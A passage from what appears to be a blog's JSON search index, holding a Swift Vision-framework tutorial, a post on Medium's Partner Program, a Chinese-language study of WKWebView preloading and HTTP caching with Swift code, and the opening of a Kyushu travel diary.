.detectBarcodes(_, let barcodesObservation): if let observation = barcodesObservation.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // Color layer for marking let colorLayer = CALayer() // iOS &gt;=18 new coordinate conversion API toImageCoordinates // Not tested; actual calculations may require adjustments for ContentMode = AspectFit: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } case .recognizeText(_, let textObservation): textObservation.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } default: print(\"Unrecognized result: \\(result)\") } } }}Optimize with Swift ConcurrencyAssuming we have a list of image thumbnails, where each image needs to be automatically cropped to focus on the main subject, we can effectively utilize Swift Concurrency to enhance loading efficiency.Original Implementationfunc generateThumbnail(url: URL) async throws -&gt; UIImage { let request = GenerateAttentionBasedSaliencyImageRequest() let saliencyObservation = try await request.perform(on: url) return cropImage(url, to: saliencyObservation.salientObjects)} func generateAllThumbnails() async throws { for image in images { image.thumbnail = try await generateThumbnail(url: image.url) }}This approach processes one image at a time, resulting in slow efficiency and performance.Optimization (1) — TaskGroup Concurrencyfunc generateAllThumbnails() async throws { try await withThrowingDiscardingTaskGroup { taskGroup in for image in images { image.thumbnail = try await generateThumbnail(url: image.url) } }}Here, each task is added to a TaskGroup for concurrent execution. Note: Image recognition and cropping operations are very memory-intensive. If too many concurrent tasks are initiated without restraint, it may lead to user lag or out-of-memory (OOM) crashes.Optimization (2) — TaskGroup Concurrency + Limiting Concurrent Tasksfunc generateAllThumbnails() async throws { try await withThrowingDiscardingTaskGroup { taskGroup in // Limit the maximum number of concurrent tasks to 5 let maxImageTasks = min(5, images.count) // Initially fill 5 tasks for index in 0..&lt;maxImageTasks { taskGroup.addTask { images[index].thumbnail = try await generateThumbnail(url: images[index].url) } } var nextIndex = maxImageTasks for try await _ in taskGroup { // When a task in the taskGroup completes... // Check if we've reached the end of the index if nextIndex &lt; images.count { let image = images[nextIndex] // Continue adding tasks (keeping the limit at 5) taskGroup.addTask { image.thumbnail = try await generateThumbnail(url: image.url) } nextIndex += 1 } } }}Update an Existing Vision App Vision will remove CPU and GPU support for certain requests on devices equipped with a Neural Engine. On these devices, the Neural Engine is the optimal choice for performance. You can check this using the supportedComputeDevices() API. Remove all VN prefixes: VNXXRequest, VNXXXObservation → Request, Observation. Use async/await instead of the original VNRequestCompletionHandler. Directly use *Request.perform() instead of the original VNImageRequestHandler.perform([VN*Request]).Wrap-Up APIs designed with new Swift language features. New functionalities and methods are Swift-only, available for iOS ≥ 18. New image scoring features, body and hand motion tracking.Thanks!KKday Recruitment👉👉👉 This sharing session originates from the weekly technical sharing activities of the KKday App Team. The team is currently actively recruiting Senior iOS Engineers. Interested candidates are welcome to submit their resumes. 👈👈👈ReferencesDiscover Swift enhancements in the Vision frameworkThe Vision Framework API has been redesigned to leverage modern Swift features like concurrency, making it easier and faster to integrate a wide array of Vision algorithms into your app. We’ll tour the updated API and share sample code, along with best practices, to help you get the benefits of this framework with less coding effort. We’ll also demonstrate two new features: image aesthetics and holistic body pose.Chapters 0:00 — Introduction 1:07 — New Vision API 1:47 — Get started with Vision 8:59 — Optimize with Swift Concurrency 11:05 — Update an existing Vision app 13:46 — What’s new in Vision?Vision framework Apple Developer DocumentationIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 835 Total Views Last Statistics Date: 2025-08-15 | 598 Views on Medium." }, { "title": "Medium Partner Program 終於對全球(包含台灣)寫作者開放啦！", "url": "/posts/zrealm-life/medium-partner-program-%E7%B5%82%E6%96%BC%E5%B0%8D%E5%85%A8%E7%90%83-%E5%8C%85%E5%90%AB%E5%8F%B0%E7%81%A3-%E5%AF%AB%E4%BD%9C%E8%80%85%E9%96%8B%E6%94%BE%E5%95%A6-cefdf4d41746/", "categories": "ZRealm Life.", "tags": "medium, paywall, stripe, earnings, 生活", "date": "2024-08-10 17:09:15 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Medium Partner Program 終於對全球(包含台灣)寫作者開放啦！所有人都可以加入 Medium Partner Program 撰寫文章獲得收益。Photo by Steve JohnsonMurmur經營 ...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Medium Partner Program 終於對全球(包含台灣)寫作者開放啦！所有人都可以加入 Medium Partner Program 撰寫文章獲得收益。Photo by Steve JohnsonMurmur經營 Medium 的初衷不是為了賺錢，是喜歡與大家分享的感覺，分享遇到的技術困難、希望能讓有同樣問題的開發者少走點彎路，或是基於我的研究再深入，我也可以從中學習到新知識；加上繁體中文寫作者很少，希望能拋磚引玉創造一個教學相長的循環風氣。所以一直對文章能不能獲利看得很淡，有也好、沒有也好，有的話可以拿盈利去實驗、購買更多服務或體驗，然後再轉寫成文章跟大家分享，可以創造一個滾動循環。從 2018 年開始在 Medium 寫文章就已經知道 Medium 有 Partner Program，但是 2018, 2019, 2020…一年過一年，Medium Partner Program 政策遲遲未有更新，一直都只限制幾個地區的寫作者 (我記得亞洲只有新加坡、日本…) 可以加入獲利；非上述地區的寫作者要獲利很 麻煩 ，需要 VPN 繞到允許的地區 + 需要該地區的帳戶或手機之類的，之前稍微研究過覺得太麻煩而且不安全。也因此很多創作者跳槽到其他平台，如 Matters, 方格子 或是自架放廣告獲利，這幾年 Medium 真的流失了許多中文創作者。Medium Partner Program直到最近 2024/08 無意間在 Medium 在後台的 Banner 喵到邀請我加入 Partner Program (我想說 What？又不開放台灣加入)，點進去看之後驚訝的發現，目前已經全開放了，幾乎所有地區的創作者都能加入 Partner Program，透過自已的文章一字一句獲得收益。 但說來有點好笑，要加入 Medium Partner Program 賺錢之前會需要你先花錢加入 Medium Member 付費會員(每個月最低 $4 美元)。2024–08–07 官方 Medium Blog 公告This post is behind Medium’s paywall, View the full post on Medium, converted by ZMediumToMarkdown.本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,439 Total Views Last Statistics Date: 2025-08-15 | 808 Views on Medium." }, { "title": "The Medium Partner Program is Finally Open to Writers Worldwide (Including Taiwan)!", "url": "/posts/zrealm-life/en/the-medium-partner-program-is-finally-open-to-writers-worldwide-including-taiwan-cefdf4d41746/", "categories": "ZRealm Life.", "tags": "medium, paywall, stripe, earnings, life", "date": "2024-08-10 17:09:15 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版The Medium Partner Program is Finally Open to Writers Worldwide(Including Taiwan)!An...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版The Medium Partner Program is Finally Open to Writers Worldwide(Including Taiwan)!Anyone can join the Medium Partner Program to write articles and earn revenue.Photo by Steve JohnsonMurmurThe original intention of running Medium was not to make money, but to enjoy sharing with everyone—the feeling of sharing technical difficulties encountered, hoping to help developers with similar issues avoid detours, or to delve deeper based on my research, from which I can also learn new knowledge; plus, there are very few Traditional Chinese writers, so I hope to inspire a cycle of mutual teaching and learning.Therefore, I have always viewed the potential for articles to generate profit with indifference; whether it exists or not is fine. If it does, I can use the earnings to experiment, purchase more services or experiences, and then rewrite them into articles to share with everyone, creating a rolling cycle.Since I started writing on Medium in 2018, I was aware of the Medium Partner Program. However, year after year—2018, 2019, 2020—the policies of the Medium Partner Program had not been updated, and it was still limited to a few regions where writers could profit (I remember only Singapore and Japan in Asia…). For writers outside these regions, earning revenue was quite troublesome, requiring a VPN to connect to an allowed region + needing an account or phone from that region, which I found too troublesome and unsafe after some research.As a result, many creators switched to other platforms, such as Matters, 方格子, or self-hosting with ads for profit. Over the years, Medium has indeed lost many Chinese creators.Medium Partner ProgramUntil recently, in August 2024, I accidentally spotted a banner in the Medium backend inviting me to join the Partner Program (I thought, What? It’s still not open for Taiwan). After clicking in, I was surprised to find that it is now fully open, and creators from almost all regions can join the Partner Program to earn revenue from their own articles, word by word. But it’s a bit funny that to join the Medium Partner Program and make money, you first need to spend money to become a Medium Member (with a minimum monthly fee of $4).Official Medium Blog Announcement on 2024–08–07This post is behind Medium’s paywall, View the full post on Medium, converted by ZMediumToMarkdown.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,439 Total Views Last Statistics Date: 2025-08-15 | 808 Views on Medium." }, { "title": "iOS WKWebView 頁面與檔案資源 Preload 預載 / Cache 緩存研究", "url": "/posts/zrealm-dev/ios-wkwebview-%E9%A0%81%E9%9D%A2%E8%88%87%E6%AA%94%E6%A1%88%E8%B3%87%E6%BA%90-preload-%E9%A0%90%E8%BC%89-cache-%E7%B7%A9%E5%AD%98%E7%A0%94%E7%A9%B6-5033090c18ba/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, cache, webview, http-request", "date": "2024-07-28 17:53:05 +0800", "snippet": "iOS WKWebView 頁面與檔案資源 Preload 預載 / Cache 緩存研究iOS WKWebView 預先下載與緩存資源提升頁面載入速度研究。Photo by Antoine Gravier背景不知為何，一直跟 “Cache” 緩存蠻有緣的，之前也負責研究實踐過 AVPlayer 的「 iOS HLS Cache 實踐方法探究之旅 」與「 AVPlayer 實踐本地 Cach...", "content": "iOS WKWebView 頁面與檔案資源 Preload 預載 / Cache 緩存研究iOS WKWebView 預先下載與緩存資源提升頁面載入速度研究。Photo by Antoine Gravier背景不知為何，一直跟 “Cache” 緩存蠻有緣的，之前也負責研究實踐過 AVPlayer 的「 iOS HLS Cache 實踐方法探究之旅 」與「 AVPlayer 實踐本地 Cache 功能大全 」；不同於串流緩存目的是減少播放流量， 這次的主要任務是提升 In-app WKWebView 載入速度 ，其中也牽涉到 WKWebView 的預先加載與緩存研究；不過老實說 WKWebView 的場景更為複雜，不同於 AVPlayer 串流影音是一個或是多個連續的 Chunk 檔案，只需要針對檔案做 Cache，WKWebView 除了本身頁面檔案還有引入的資源檔案( .js, .css, font, image…) 再經由 Browser Engine 渲染出頁面呈現給使用者，這中間不是 App 可以控制的環節太多，從網路到前端頁面 JavaScript 語法效能、渲染方式，都需要花費時間。本篇文章只是就 iOS 技術上可行性進行研究，並不一定是最終解法，綜觀來說此議題還是請前端從前端下手比較能達成四兩撥千斤的效果 ，請前端夥伴優化第一個畫面出現的時間(First Contentful Paint) 與完善 HTTP Cache 機制，一方面能加速 Web/mWeb 自身，同時影響 Android/iOS in-app WebView 速度，並且也會提升 Google SEO 權重 。技術細節iOS 限制根據 Apple Review Guidelines 2.5.6 ： Apps that browse the web must use the appropriate WebKit framework and WebKit JavaScript. You may apply for an entitlement to use an alternative web browser engine in your app. Learn more about these entitlements .Apps 內只能使用 Apple 提供的 WebKit Framework (WKWebView) 不允許使用第三方或自行修改過的 WebKit 引擎 ，否則將不允許上架；另外 iOS 17.4 開始，為符合法規，歐盟地區可以在 取得 Apple 特別許可 後 使用其他 Browser Engine 。 蘋果不給的，我們也不能做。[未驗證] 查資料說就連 iOS 版的 Chrome, Firefox 也都是只能用 Apple WebKit (WKWebView)。另外還有一個很重要的事： WKWebView 是跑在 App 主執行緒之外的獨立執行緒，因此所有請求、操作都不會經過我們的 App。HTTP Cache Flow在 HTTP 協議中就有包含 Cache 協議，並且在所有跟網路有關的元件(URLSession, WKWebView…)當中系統都已經幫我們實作好了 Cache 機制，因此 Client App 這邊不需要做任何實現，也不推薦大家自己幹一套自己的 Cache 機制，直接走 HTTP 協議才是最快最穩定最有效的路。HTTP Cache 大致運作流程如上圖： Client 發起請求 Server 響應 Cache 策略在 Response Header，系統 URLSession, WKWebView… 會依照 Cache Header 自動幫我們將 Response 緩存下來，後續請求也會自動套用這個策略 再次請求相同資源時，如果緩存未過期則直接從記憶體、磁碟讀取本地緩存直接回應給 App 如果已過期(過期不代表無效)，則發起真實網路請求問 Server，如果內容沒更改 (雖過期待仍有效) Server 會直接回應 304 Not Modified (Empt Body)，雖然真的有發起網路請求但是基本上是毫秒回應＋無 Response Body 沒什麼流量耗損 如果內容有更改則重新給一次資料跟 Cache Header。 緩存除了本地 Cache、在 Network Proxy Server 或途經的路上也可能有網路的緩存。常見 HTTP Response Cache Header 參數：expires: RFC 2822 日期pragma: no-cache# 較新的參數:cache-control: private/public/no-store/no-cache/max-age/s-max-age/must-revalidate/proxy-revalidate...etag: XXX常見 HTTP Request Cache Header 參數：If-Modified-Since: 2024-07-18 13:00:00IF-None-Match: 1234 在 iOS 中網路有關的元件(URLSession, WKWebView…)會自己處理 HTTP Request/Response Cache Header 並自動做緩存，我們不需自己處理 Cache Header 參數。更詳細的 HTTP Cache 運作細節可參考「 Huli 大大寫的循序漸進理解 HTTP Cache 機制 」iOS WKWebView 總攬回到 iOS 上，因為我們只能使用 Apple WebKit，因此只能從蘋果提供的 WebKit 方法下手，探究有機會達成預載緩存的方式。上圖是使用 ChatGPT 4o 簡介的所有 Apple iOS WebKit (WKWebView) 相關的方法，並附上簡短說明；綠色部分為跟資料儲存有關的方法。跟大家分享其中比較幾個有趣的方法： WKProcessPool：可以讓多個 WKWebView 之間共享資源、數據、Cookie…等等。 WKHTTPCookieStore：可以管理 WKWebView Cookie，WKWebView 與 WKWebView 之間或是 App 內的 URLSession Cookie 與 WKWebView。 WKWebsiteDataStore：管理網站緩存檔案。(只能讀資訊跟清除) WKURLSchemeHandler：當 WKWebView 無法認得處理的 URL Scheme 則可註冊自定義 Handler 處理。 WKContentWorld：可以把注入的 JavaScript (WKUserScript) 腳本分組管理。 WKFindXXX：可以控制頁面搜尋功能。 WKContentRuleListStore：可以在 WKWebView 內實現內容阻擋器功能(e.g. 遮擋廣告之類的)。iOS WKWebView 預載緩存可行性方案研究完善 HTTP Cache ✅如同前文介紹的 HTTP Cache 機制，我們可以請 Web Team 完善活動頁面的 HTTP Cache 設定，Client iOS 這邊只需要簡單的檢查一下 CachePolicy 設定就好，其他的事系統都做好了！CachePolicy 設定URLSession:let configuration = URLSessionConfiguration.defaultconfiguration.requestCachePolicy = .useProtocolCachePolicylet session = URLSession(configuration: configuration)URLRequest/WKWebView:var request = URLRequest(url: url)request.cachePolicy = .reloadRevalidatingCacheData//wkWebView.load(request) useProtocolCachePolicy : 默認，照默認 HTTP Cache 控制。 reloadIgnoringLocalCacheData : 不使用本地快取，每次請求都從網絡加載數據(但允許網路, Proxy 快取…)。 reloadIgnoringLocalAndRemoteCacheData : 無論本地或遠端快取，總是從網絡加載數據。 returnCacheDataElseLoad : 如果有快取數據則使用快取數據，否則從網絡加載數據。 returnCacheDataDontLoad : 僅使用快取數據，如果沒有快取數據也不打網路請求。 reloadRevalidatingCacheData : 發送請求檢查本地快取是否過期，如果沒有過期(304 Not Modified)則使用快取數據，否則從網絡重新加載數據。設定快取大小App 全域:let memoryCapacity = 512 * 1024 * 1024 // 512 MBlet diskCapacity = 10 * 1024 * 1024 * 1024 // 10 GBlet urlCache = URLCache(memoryCapacity: memoryCapacity, diskCapacity: diskCapacity, diskPath: \"myCache\") URLCache.shared = urlCache個別 URLSession:let memoryCapacity = 512 * 1024 * 1024 // 512 MBlet diskCapacity = 10 * 1024 * 1024 * 1024 // 10 GBlet cache = URLCache(memoryCapacity: memoryCapacity, diskCapacity: diskCapacity, diskPath: \"myCache\") let configuration = URLSessionConfiguration.defaultconfiguration.urlCache = cache 另外同前述，WKWebView 是跑在 App 主執行緒之外的獨立執行緒，因此 URLRequest, URLSession 的快取跟 WKWebView 的是不共用的。如何在 WKWebView 中使用 Safari 開發者工具?檢查是否是使用本地 Cache 快取。Safari 啟用開發者功能：WKWebView 啟用 isInspectable：func makeWKWebView() -&gt; WKWebView { let webView = WKWebView(frame: .zero) webView.isInspectable = true // is only available in ios 16.4 or newer return webView}WKWebView 加上 webView.isInspectable = true 才能在 Debug Build 版使用 Safari 開發者工具。p.s. 這是我另開的測試 WKWebView 用 Project在 webView.load 的地方下一個斷點。開始測試：Build &amp; Run：執行到 webView.load 斷點時，點擊「逐行偵錯」。回到 Safari，選擇工具列的「開發」-&gt;「模擬器」-&gt;「你的專案」-&gt;「about:blank」。 因為頁面尚未開始載入 所以網址會是 about:blank 如果沒出現 about:blank 就再回到 XCode 點一次逐行偵錯按鈕，直到出現為止出現該頁面對應的開發者工具：回 XCode 點擊繼續執行：再回到 Safari 開發者工具就能看到資源載入狀況跟完整的開發者工具功能了 (元件、儲存空間調試…等等)如果網路資源有 HTTP Cache，傳算大小則會顯示「磁碟」：點進去也能看到緩存資訊。清除 WKWebView 快取// Clean CookiesHTTPCookieStorage.shared.removeCookies(since: Date.distantPast)// Clean Stored Data, Cache Datalet dataTypes = WKWebsiteDataStore.allWebsiteDataTypes()let store = WKWebsiteDataStore.default()store.fetchDataRecords(ofTypes: dataTypes) { records in records.forEach { record in store.removeData( ofTypes: record.dataTypes, for: records, completionHandler: { print(\"clearWebViewCache() - \\(record)\") } ) }}可使用以上方法清除 WKWebView 已緩存的資源、本地數據、Cookie 數據。 但完善 HTTP Cache 只是做到緩存部分(第二次進入很快)，預載(第一次進入)不會有影響。 ✅完善 HTTP Cache + WKWebView Preload 全頁面 😕class WebViewPreloader { static let shared = WebViewPreloader() private var _webview: WKWebView = WKWebView() private init() { } func preload(url: URL) { let request = URLRequest(url: url) Task { @MainActor in webview.load(request) } }}WebViewPreloader.shared.preload(\"https://zhgchg.li/campaign/summer\")基於完善 HTTP Cache 之後，第二次 Load WKWebView 會有緩存，我們可以先在列表或首頁偷先把裡面的 URL 都 Load 過一次讓他有緩存，使用者進去之後就會比較快。 經過測試，原理上可行；但是對性能、網路流量損耗太大 ；使用者可能根本沒進去詳細頁，但我們為了做預載把所有頁面全都 Load 了一遍，有點亂槍打鳥的感覺。 個人認為現實上不可行，且利大於弊、因噎廢食。😕完善 HTTP Cache + WKWebView Preload 純資源🎉基於上面方法的優化，我們可以搭配 HTML Link Preload 方法，僅針對頁面裡面會用到的資源檔案(e.g. .js, .css, font, image…)進行 Preload，讓使用者進去之後可以直接使用緩存資源，不用再發起網路請求拿資源檔案。 意即我不預載整個頁面的所有東西了，我只預載頁面會用到的資源檔案，這些檔案可能也是跨頁面共用的；頁面檔案 .html 還是從網路拿取再結合預載檔案渲染出頁面。請注意：這邊依然走的是 HTTP Cache，因此這些資源也要支援 HTTP Cache，否則之後請求還是會走網路。請注意：這邊依然走的是 HTTP Cache，因此這些資源也要支援 HTTP Cache，否則之後請求還是會走網路。請注意：這邊依然走的是 HTTP Cache，因此這些資源也要支援 HTTP Cache，否則之後請求還是會走網路。&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-tw\"&gt; &lt;head&gt; &lt;link rel=\"preload\" href=\"https://cdn.zhgchg.li/dist/main.js\" as=\"script\"&gt; &lt;link rel=\"preload\" href=\"https://image.zhgchg.li/v2/image/get/campaign.jpg\" as=\"image\"&gt; &lt;link rel=\"preload\" href=\"https://cdn.zhgchg.li/assets/fonts/glyphicons-halflings-regular.woff2\" as=\"font\"&gt; &lt;link rel=\"preload\" href=\"https://cdn.zhgchg.li/assets/fonts/Simple-Line-Icons.woff2?v=2.4.0\" as=\"font\"&gt; &lt;/head&gt;&lt;/html&gt;常見支援檔案類型： .js script .css style font imageWeb Team 將以上 HTML 內容放在與 App 約定好的路徑，我們的 WebViewPreloader 改去 Load 這個路徑，WKWebView Load 的同時就會解析 &lt;link&gt; preload 資源產生緩存了。WebViewPreloader.shared.preload(\"https://zhgchg.li/campaign/summer/preload\")// or 統一都在WebViewPreloader.shared.preload(\"https://zhgchg.li/assets/preload\") 經過測試，可以在流量損耗與預載中取得一個不錯的平衡 。 🎉 缺點應該是需要維護這份 Cache 資源列表，跟還是需要 Web 優化頁面渲染跟載入，不然第一個頁面出現的體感時間依然會很久。URLProtocol ❌另外想到我們的老朋友 URLProtocol ，所有基於 URL Loading System 的請求 (URLSession, openURL…) 都可以被攔截下來操作。class CustomURLProtocol: URLProtocol { override class func canInit(with request: URLRequest) -&gt; Bool { // 判斷是否要處理這個請求 if let url = request.url { return url.scheme == \"custom\" } return false } override class func canonicalRequest(for request: URLRequest) -&gt; URLRequest { // 返回請求 return request } override func startLoading() { // 處理請求並加載數據 // 改成緩存策略，先從本地讀檔案 if let url = request.url { let response = URLResponse(url: url, mimeType: \"text/plain\", expectedContentLength: -1, textEncodingName: nil) self.client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed) let data = \"This is a custom response!\".data(using: .utf8)! self.client?.urlProtocol(self, didLoad: data) self.client?.urlProtocolDidFinishLoading(self) } } override func stopLoading() { // 停止加載數據 }}// AppDelegate.swift didFinishLaunchingWithOptions:URLProtocol.registerClass(CustomURLProtocol.self)抽象想法是在背景偷發 URLReqeust -&gt; URLProtocol -&gt; 從中自己下載所有資源，使用者 -&gt; WKWebView -&gt; Request -&gt; URLProtocol -&gt; 回應預載的資源。 一樣同前述，WKWebView 是跑在 App 主執行緒之外的獨立執行緒，因此 URLProtocol 是攔截不到 WKWebView 的請求的。 但聽說上黑魔法好像可以，不推薦、會延伸其他問題(送審被拒) 此路不通 ❌。WKURLSchemeHandler 😕蘋果在 iOS 11 推出的新方法，感覺是為了補足 WKWebView 無法使用 URLProtocol 的特型；但是這個方法跟 AVPlayer 的 ResourceLoader 比較類似， 只有系統無法辨識的 Scheme 才會丟給我們自己訂的 WKURLSchemeHandler 進行處理 。抽象想法一樣是在背景偷發 WKWebView -&gt; Request -&gt; WKURLSchemeHandler -&gt; 從中自己下載所有資源，使用者 -&gt; WKWebView -&gt; Request -&gt; WKURLSchemeHandler -&gt; 回應預載的資源。import WebKitclass CustomSchemeHandler: NSObject, WKURLSchemeHandler { func webView(_ webView: WKWebView, start urlSchemeTask: WKURLSchemeTask) { // 處理自定義 let url = urlSchemeTask.request.url! if url.scheme == \"custom-scheme\" { // 改成緩存策略，先從本地讀檔案 let response = URLResponse(url: url, mimeType: \"text/html\", expectedContentLength: -1, textEncodingName: nil) urlSchemeTask.didReceive(response) let html = \"&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello from custom scheme!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\" let data = html.data(using: .utf8)! urlSchemeTask.didReceive(data) urlSchemeTask.didFinish() } } func webView(_ webView: WKWebView, stop urlSchemeTask: WKURLSchemeTask) { // 停止 }}let webViewConfiguration = WKWebViewConfiguration()webViewConfiguration.setURLSchemeHandler(CustomSchemeHandler(), forURLScheme: \"mycacher\")let customURL = URL(string: \"mycacher://zhgchg.li/campaign/summer\")!webView.load(URLRequest(url: customURL)) 因為 http/https 是系統能處理的 Scheme 所以我們不能自定義 http/https 的處理；需要把 Scheme 換成系統認不得的 Scheme (e.g. mycacher:// )。 頁面裡面統一都要用相對路徑才會自動套上 mycacher:// 讓我們的 Handler 捕獲。 如果不想改 http/https 又想獲取 http/https 請求只能上黑魔法， 不推薦、 會延伸其他問題(送審被拒) 自行緩存頁面檔案並響應，頁面中使用的 Ajax, XMLHttpRequest, Fetch 請求可能會被 CORS 同源政策 阻擋 ，要降低網站安全性才能使用 (因為會變成 mycacher:// 發送請求打 http://zhgchg.li/xxx，不同源) 可能需要自己實現 Cache Policy，例如那何時該更新？有效多久？ (這就跟 HTTP Cache 在做的事一樣了) 綜合以上，雖然原理上可行，但是實現上投入巨大；整體來說不符合效益並且很難擴充跟保持穩定性 😕感覺 WKURLSchemeHandler 這方法比較適合針對網頁內有很大的資源檔案需要下載，宣告一個自訂的 Scheme 丟給 App 去處理，互相合作渲染出網頁。橋接 WKWebView 網路請求改由 App 發送 🫥WKWebView 改成打 App 定好的接口 (WkUserScript) 替代 Ajax, XMLHttpRequest, Fetch，由 App 去請求資源。 以此案例幫助不大，因為是第一個畫面出現的時間太慢，而不是後續加載太慢；並且此方法會造成 Web x App 有過深根奇怪的依賴關係 🫥從 Service Worker 下手 ❌ 基於安全性問題，只有蘋果自己的 Safari App 支援，WKWebView 不支援❌。WKWebView 性能優化 🫥優化提升 WKWebView Load View 的性能。 WKWebView 本身像是骨架、Web 頁面是血肉，研究下來優化骨架(e.g. 復用 WKProcessPool)的效果很有限，可能是 0.0003 -&gt; 0.000015 秒的區別。Local HTML, Local 資源檔案 🫥類似 Preload 方式，只是改成將活動頁放入 App Bundle 或是啟動時從遠端拿。 放整個 HTML 頁面可能也會遇到 CORS 同源問題；純放網頁資源檔案感覺可以使用 「完善 HTTP Cache + WKWebView Preload 純資源」方式取代；放 App Bundle 徒增 App Size、從遠端拿就是 WKWebView Preload 🫥前端優化下手 🎉🎉🎉Source: wedevs參考 wedevs 優化建議 ，前端 HTML 頁面應該會有四個載入階段，從一開始載完頁面檔案 ( .html) First Paint (空白頁) 到 First Contentful Paint (渲染出頁面骨架) 再到 First Meaningful Paint (補上頁面內容) 到 Time To Interactive(最後可讓使用者互動)。用我們的頁面測試；瀏覽器、WKWebView 會先請求頁面本體 .html 再載入需要用到的資源，同時依照程式指引構建出畫面給使用者，對比文章發現頁面階段其實只有 First Paint (空白)到 Time To Interactive (First Contentful Paint 只有 Navigation Bar 應該不太算…)，少了中間的分階段渲染給使用者，因此使用者整體等待時間會拉長。 並且目前只有資源類的檔案有設定 HTTP Cache，頁面本體沒有。另外也可以參考 Google PageSpeed Insights 建議進行優化，例如壓縮、減少腳本大小. .等等 因為 in-app WKWebView 的核心還是 Web 頁面本身；因此從前端網頁下手調整是個很好的四兩撥千斤方式 。🎉🎉🎉使用者體驗下手 🎉🎉🎉 一個簡單的實現，從使用者體驗下手，增加 Loading Progress Bar，不要只展示空白頁面讓使用者不知所措，讓他知道頁面正在加載中並且進度到哪裡。🎉🎉🎉結論以上就是本次探究 WKWebView 預載與緩存可行方案的一些發想研究，技術反而不是最大的問題，重點還是選擇，哪些方式才是對使用者最有效對開發端投入成本最低的方案，選擇這些方式可能小小改了些地方就能直接達成目標；選擇錯誤的方式會導致投入巨大的資源繞圈圈並且很有可能在後續難以維護跟使用。 辦法總比困難多，有時候是缺少想像。說不定也有我沒想到的神級組合做法，歡迎大家協助補充。參考資料WKWebView Preload 純資源🎉 方案可參考以下影片另外作者也有提到 WKURLSchemeHandler 的方法。影片中的完整 Demo Repo 如下：iOS 老司機週報老司機週報中關於 WkWebView 的分享也值得一看。雜談久違的回歸撰寫 iOS 開發相關長篇文章。有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,381 Total Views Last Statistics Date: 2025-08-15 | 1,314 Views on Medium." }, { "title": "遊記 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境", "url": "/posts/z-%E5%BA%A6%E6%97%85%E8%A1%8C%E9%81%8A%E8%A8%98/%E9%81%8A%E8%A8%98-2024-%E4%BA%8C%E8%A8%AA%E4%B9%9D%E5%B7%9E-9-%E6%97%A5%E8%87%AA%E7%94%B1%E8%A1%8C-%E7%B6%93%E9%87%9C%E5%B1%B1-%E5%8D%9A%E5%A4%9A%E9%83%B5%E8%BC%AA%E5%85%A5%E5%A2%83-cb65fd5ab770/", "categories": "Z 度旅行遊記", "tags": "生活, japan, travel, fukuoka, travel-writing", "date": "2024-06-21 01:17:26 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境韓國釜山搭乘新山茶花號郵輪入境日本博多，遊歷由布院、大分、福岡、下關、絲島、佐世保；共 11 日背景趁著結束階段性工作任務到新工作的短暫期間，再去日本走走透透氣；...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境韓國釜山搭乘新山茶花號郵輪入境日本博多，遊歷由布院、大分、福岡、下關、絲島、佐世保；共 11 日背景趁著結束階段性工作任務到新工作的短暫期間，再去日本走走透透氣；5/30 離職、6/3 出發、6/13 回程、6/24 新工作到職，時間抓得剛好，因是工作轉換空擋才能去比較長的時間(合計 11 天)；這次是偽獨旅，跟去年一起去 東京 的 James Lin (Ex-Binance Android Developer, 有工作機會歡迎介紹給他)組隊；這是我第二次造訪九州， 去年 9 月第一次來九州 去了福岡、熊本、長崎 的必訪景點；這次主要補上上次沒去到的地方；所以行程上會跟 James 不同，分頭行動。以下是上次去過的景點這次不一定會再去，有興趣了解更多九州的朋友請參考我上一篇遊記「 2023 九州 10 日自由行獨旅 」： 福岡：門司港、小倉城、櫛田神社、住吉神社、中洲屋台、福岡塔、Pay Pay Dome、天神逛街、博多運河城、Lalaport、柳川游船、太宰府 長崎：中華街、哥巴拉園、稻佐山夜景、原爆資料館、和平公園 熊本：熊本城、阿蘇中岳、阿蘇神社、水前寺承趣園、鶴舞百貨、上通商店街、下通商店街、加藤神社、櫻町百貨、熊本熊廣場（部長辦公室） 以上，請參考 2023 九州 10 日自由行獨旅 。此行學到的事一樣把總結此行學到的事寫在前面，「自由行就是不斷地繳學費(花時間或金錢)學習，經驗多了會踩的坑也越來越少」。 在 JR 無任何電子看板的小站，要看月台公佈欄的時刻表確定列車停靠月台。 ⚠️ 在 JR 部分無站長的小站，要下車要到第一節車廂(車長兼站長、類似公車下車的方式) JR 